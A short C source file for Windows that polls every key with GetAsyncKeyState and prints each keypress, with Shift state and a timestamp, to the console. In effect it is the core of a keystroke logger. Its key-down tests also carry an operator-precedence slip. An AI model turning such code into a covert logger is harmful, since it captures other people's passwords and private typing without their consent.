#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Winuser.h>
#include <time.h>
#include "header.h"

void checkKeyboard(int flag, int inKeys[NUMKEYS], char outKeys[NUMKEYS][KEYLETTERS], char shiftedKeys[SHIFTKEYS][KEYLETTERS]) {
    int i;
    for (i = 0; i < NUMKEYS; i++) {
        int checkShift = GetAsyncKeyState(0x10);
        if (checkShift & (0x8000 != 0)) {
            shiftPrint();
        }
        int checkKey = GetAsyncKeyState(inKeys[i]) & (0x8000 != 0);
        if (checkKey) {
            nonShiftPrint(checkShift, flag, i, outKeys, shiftedKeys);
        }
    }
    Sleep(20);
}

void nonShiftPrint(int checkShift, int flag, int counter, char outKeys[NUMKEYS][KEYLETTERS], char shiftedKeys[SHIFTKEYS][KEYLETTERS]) {
    if (flag != 0) {
        if (checkShift != 0 && counter < SHIFTKEYS) {
            printTime();
            printf("'%s' \n", shiftedKeys[counter]);
        } else {
            printTime();
            printf("'%s' \n", outKeys[counter]);
        }
    }
}

void shiftPrint() {
    printTime();
    printf("'shift' \n");
}

void printTime() {
    time_t t;
    time(&t);
    char timeString[30];
    strncpy (timeString, ctime(&t), 19);
    timeString[19] = '\0';
    printf("[%s]: ", timeString);
}